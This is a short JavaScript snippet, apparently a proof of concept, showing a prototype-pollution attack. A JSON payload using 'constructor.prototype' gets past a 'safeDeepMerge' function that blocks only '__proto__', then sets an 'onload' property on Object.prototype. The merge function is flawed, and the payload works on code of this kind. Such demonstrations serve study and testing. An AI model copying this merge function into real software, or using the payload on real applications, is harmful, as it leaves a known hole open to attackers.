const mergableTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];
const safeDeepMerge = (target, source) => {
  for (const key in source) {
    if(!mergableTypes.includes(typeof source[key]) && !mergableTypes.includes(typeof target[key])){
      if(key !== '__proto__'){
        safeDeepMerge(target[key], source[key]);
      }
    } else {
      target[key] = source[key];
    }
  }
}

const userWidgets = JSON.parse(`{
  "constructor": {
    "prototype": {
      "onload": "console.log(1)"
    }
  }
}`)

let toDisplayWidgets = {'welcome back to build a panel!': {'type': 'welcome'}};
safeDeepMerge(toDisplayWidgets, userWidgets);
console.log(Object.prototype.onload) // console.log(1)